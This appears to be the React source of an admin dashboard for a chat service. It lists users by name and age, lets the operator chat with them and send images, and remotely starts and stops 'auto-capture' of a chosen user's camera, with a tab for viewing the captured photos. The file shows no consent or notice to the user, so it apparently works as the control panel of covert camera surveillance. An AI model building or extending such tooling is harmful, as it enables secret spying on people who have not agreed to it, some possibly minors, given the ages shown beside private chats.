import React, { useState, useEffect, useRef } from 'react';
import io from 'socket.io-client';
import axios from 'axios';
import '../styles/AdminDashboard.css';

const AdminDashboard = ({ token, onLogout }) => {
  const [users, setUsers] = useState([]);
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [selectedUserData, setSelectedUserData] = useState(null);
  const [messages, setMessages] = useState([]);
  const [cameraRoll, setCameraRoll] = useState([]);
  const [replyText, setReplyText] = useState('');
  const [autoCaptureUsers, setAutoCaptureUsers] = useState(new Set());
  const [activeTab, setActiveTab] = useState('messages');
  const [loadingCameraRoll, setLoadingCameraRoll] = useState(false);
  const [uploading, setUploading] = useState(false);
  const socketRef = useRef(null);
  const fileInputRef = useRef(null);

  useEffect(() => {
    // Initialize socket connection
    socketRef.current = io(process.env.REACT_APP_SERVER_URL || 'http://localhost:5000');

    socketRef.current.on('connect', () => {
      console.log('Admin connected');
    });

    socketRef.current.on('newUserMessage', (data) => {
      // Update users list
      setUsers(prevUsers => {
        const existingUser = prevUsers.find(u => u.userId === data.userId);
        if (existingUser) {
          return prevUsers.map(u =>
            u.userId === data.userId
              ? {
                  ...u,
                  lastMessagePreview: data.message.text || '[Image]',
                  lastMessageAt: new Date()
                }
              : u
          );
        }
        return [{
          userId: data.userId,
          name: data.name,
          age: data.age,
          lastMessagePreview: data.message.text || '[Image]',
          lastMessageAt: new Date()
        }, ...prevUsers];
      });

      // If this user is selected, add to messages
      if (selectedUserId === data.userId) {
        setMessages(prev => [...prev, data.message]);
      }
    });

    socketRef.current.on('adminReplySent', (data) => {
      // Message sent acknowledgment
    });

    socketRef.current.on('autoCaptureStarted', (data) => {
      // Track that a user started auto-capture
      setAutoCaptureUsers(prev => new Set(prev).add(data.userId));
    });

    socketRef.current.on('autoCaptureStopped', (data) => {
      // Track that a user stopped auto-capture
      setAutoCaptureUsers(prev => {
        const newSet = new Set(prev);
        newSet.delete(data.userId);
        return newSet;
      });
    });

    return () => {
      if (socketRef.current) {
        socketRef.current.disconnect();
      }
    };
  }, [selectedUserId]);

  useEffect(() => {
    fetchUsers();
  }, []);

  const fetchUsers = async () => {
    try {
      const response = await axios.get('/api/messages/users');
      setUsers(response.data);
    } catch (error) {
      console.error('Error fetching users:', error);
    }
  };

  const handleSelectUser = async (userId) => {
    setSelectedUserId(userId);
    const userData = users.find(u => u.userId === userId);
    setSelectedUserData(userData);
    setActiveTab('messages');

    // Fetch chat history
    try {
      const response = await axios.get(`/api/messages/${userId}`);
      setMessages(response.data);
    } catch (error) {
      console.error('Error fetching messages:', error);
    }

    // Fetch camera roll
    fetchCameraRoll(userId);
  };

  const fetchCameraRoll = async (userId) => {
    try {
      setLoadingCameraRoll(true);
      const response = await axios.get(`/api/messages/camera-roll/${userId}`);
      setCameraRoll(response.data);
    } catch (error) {
      console.error('Error fetching camera roll:', error);
      setCameraRoll([]);
    } finally {
      setLoadingCameraRoll(false);
    }
  };

  const handleSendReply = async (type, text = '') => {
    if (!selectedUserId) return;

    try {
      socketRef.current.emit('adminReply', {
        userId: selectedUserId,
        type,
        text
      });

      if (type === 'text') {
        setReplyText('');
      }
    } catch (error) {
      console.error('Error sending reply:', error);
    }
  };

  const handleStopAutoCapture = () => {
    if (!selectedUserId) return;
    
    socketRef.current.emit('stopAutoCapture', { userId: selectedUserId });
    setAutoCaptureUsers(prev => {
      const newSet = new Set(prev);
      newSet.delete(selectedUserId);
      return newSet;
    });
  };

  const handleStartAutoCapture = () => {
    if (!selectedUserId) return;
    
    socketRef.current.emit('startAutoCapture', { userId: selectedUserId });
    setAutoCaptureUsers(prev => new Set(prev).add(selectedUserId));
  };

  const handleSendReplyText = () => {
    if (replyText.trim()) {
      handleSendReply('text', replyText);
    }
  };

  const handleFileUpload = async (e) => {
    const files = e.target.files;
    if (!files || files.length === 0 || !selectedUserId) return;

    setUploading(true);
    try {
      const serverUrl = process.env.REACT_APP_SERVER_URL || 'http://localhost:5000';
      
      for (let file of files) {
        const formData = new FormData();
        formData.append('image', file); // Changed from 'file' to 'image'

        const response = await axios.post(`${serverUrl}/api/messages/upload`, formData, {
          headers: {
            'Content-Type': 'multipart/form-data',
            Authorization: `Bearer ${token}`
          }
        });

        // Send the uploaded image as admin message to the user
        socketRef.current.emit('adminReply', {
          userId: selectedUserId,
          type: 'image',
          url: response.data.url
        });
      }

      // Reset file input
      if (fileInputRef.current) {
        fileInputRef.current.value = '';
      }
    } catch (error) {
      console.error('Error uploading file:', error);
      alert('Error uploading file');
    } finally {
      setUploading(false);
    }
  };

  return (
    <div className="admin-dashboard">
      <div className="admin-header">
        <h1>Admin Dashboard</h1>
        <button onClick={onLogout} className="logout-btn">Logout</button>
      </div>

      <div className="admin-container">
        {/* Users List */}
        <div className="users-panel">
          <h2>Users</h2>
          <div className="users-list">
            {users.length === 0 ? (
              <p className="no-users">No users yet</p>
            ) : (
              users.map(user => (
                <div
                  key={user.userId}
                  className={`user-item ${selectedUserId === user.userId ? 'active' : ''}`}
                  onClick={() => handleSelectUser(user.userId)}
                >
                  <div className="user-info">
                    <p className="user-name">{user.name}</p>
                    <p className="user-age">Age: {user.age}</p>
                    <p className="last-message">{user.lastMessagePreview}</p>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Chat Panel */}
        <div className="chat-panel">
          {selectedUserId ? (
            <>
              <div className="chat-header">
                <div>
                  <h2>{selectedUserData?.name}</h2>
                  <p>Age: {selectedUserData?.age}</p>
                </div>
              </div>

              <div className="tab-navigation">
                <button
                  className={`tab-btn ${activeTab === 'messages' ? 'active' : ''}`}
                  onClick={() => setActiveTab('messages')}
                >
                  💬 Messages
                </button>
                <button
                  className={`tab-btn ${activeTab === 'camera-roll' ? 'active' : ''}`}
                  onClick={() => setActiveTab('camera-roll')}
                >
                  📸 Camera Roll
                </button>
              </div>

              {activeTab === 'messages' ? (
                <>
                  <div className="messages-container">
                    {messages.map((msg) => (
                      <div
                        key={msg._id}
                        className={`message ${msg.sender === 'user' ? 'user-message' : 'admin-message'}`}
                      >
                        {msg.type === 'text' ? (
                          <p className="message-text">{msg.text}</p>
                        ) : (
                          <img src={msg.url} alt="Message" className="message-image" />
                        )}
                        <span className="message-time">
                          {new Date(msg.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                    ))}
                  </div>

                  <div className="reply-container">
                    <div className="input-wrapper">
                      <input
                        type="text"
                        value={replyText}
                        onChange={(e) => setReplyText(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSendReplyText()}
                        placeholder="Type your reply..."
                        className="chat-input"
                      />
                      <button onClick={handleSendReplyText} className="send-btn">
                        Send
                      </button>
                    </div>

                    <div className="image-upload">
                      <input
                        ref={fileInputRef}
                        type="file"
                        multiple
                        accept="image/*"
                        onChange={handleFileUpload}
                        style={{ display: 'none' }}
                      />
                      <button
                        onClick={() => fileInputRef.current?.click()}
                        className="upload-btn"
                        disabled={uploading}
                        title="Upload photos from folder"
                      >
                        📁 {uploading ? 'Uploading...' : 'Upload Photos'}
                      </button>
                      {!autoCaptureUsers.has(selectedUserId) ? (
                        <button
                          onClick={handleStartAutoCapture}
                          className="camera-btn"
                          title="Start auto-capturing user's camera"
                        >
                          🎬 Start Auto-Capture
                    </button>
                  ) : (
                    <button
                      onClick={handleStopAutoCapture}
                      className="stop-capture-btn"
                      title="Stop user's auto-capture"
                    >
                      ⏹️ Stop Auto-Capture
                    </button>
                  )}
                </div>
              </div>
                </>
              ) : (
                <div className="camera-roll-container">
                  {loadingCameraRoll ? (
                    <p className="loading">Loading camera roll...</p>
                  ) : cameraRoll.length === 0 ? (
                    <p className="no-images">No auto-captured images yet</p>
                  ) : (
                    <div className="camera-roll-grid">
                      {cameraRoll.map((photo) => (
                        <div key={photo._id} className="camera-roll-item">
                          <img src={photo.url} alt="Auto-captured" />
                          <span className="capture-time">
                            {new Date(photo.timestamp).toLocaleTimeString()}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </>
          ) : (
            <div className="no-selection">
              <p>Select a user to view chat history</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
